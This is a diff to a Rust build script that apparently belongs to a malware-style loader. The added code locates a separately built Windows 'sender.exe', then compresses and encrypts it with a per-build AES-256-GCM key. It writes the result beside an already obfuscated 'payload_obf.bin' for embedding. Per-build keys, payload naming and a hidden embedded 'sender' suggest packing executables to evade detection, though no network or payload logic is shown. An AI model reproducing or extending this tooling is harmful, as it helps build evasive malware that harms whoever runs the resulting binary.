@@ -180,6 +180,51 @@ fn main() {
     let out_path = out_dir.join("payload_obf.bin");
     fs::write(&out_path, &obfuscated).expect("write obfuscated payload");
 
+    // Embed sender.exe (built before main) with a distinct per-build key
+    let sender_seed = seed.wrapping_add(0x5EED_5EED_5EED_5EED);
+    let sender_key   = rand_key_from_seed(sender_seed);
+    let sender_nonce = rand_nonce_from_seed(sender_seed.wrapping_add(0xBEEFCAFE1234));
+
+    let sender_key_path   = out_dir.join("sender_key.bin");
+    let sender_nonce_path = out_dir.join("sender_nonce.bin");
+    fs::write(&sender_key_path,   &sender_key).expect("write sender_key.bin");
+    fs::write(&sender_nonce_path, &sender_nonce).expect("write sender_nonce.bin");
+
+    let sender_candidates = [
+        env::var("SENDER_EXE").ok().map(PathBuf::from),
+        Some(manifest_dir.join("target/x86_64-pc-windows-gnu/release/sender.exe")),
+        Some(manifest_dir.join("target/release/sender.exe")),
+        env::var("CARGO_TARGET_DIR")
+            .ok()
+            .map(|d| PathBuf::from(d).join("release/sender.exe")),
+    ];
+
+    let sender_obf = if env::var("CARGO_BIN_NAME").as_deref() == Ok("sender") {
+        println!("cargo:warning=building sender bin — skipping self-embed");
+        Vec::new()
+    } else if let Some(sender_path) = sender_candidates
+        .into_iter()
+        .flatten()
+        .find(|p| p.exists() && p.metadata().map(|m| m.len()).unwrap_or(0) > 0)
+    {
+        let sender_bytes = fs::read(&sender_path).expect("read sender.exe");
+        let obf = obfuscate_aes(&sender_bytes, &sender_key, &sender_nonce);
+        println!(
+            "cargo:warning=embedded sender (deflate+AES-256-GCM) from {} ({} -> {} bytes)",
+            sender_path.display(),
+            sender_bytes.len(),
+            obf.len(),
+        );
+        println!("cargo:rerun-if-changed={}", sender_path.display());
+        obf
+    } else {
+        println!("cargo:warning=sender.exe not found — embedded sender disabled (inline fallback)");
+        Vec::new()
+    };
+
+    let sender_out = out_dir.join("sender_obf.bin");
+    fs::write(&sender_out, &sender_obf).expect("write obfuscated sender");
+
     if let Ok(prefix) = env::var("COMPILE_PREFIX") {
         println!("cargo:rustc-env=COMPILE_PREFIX={}", prefix);
     }
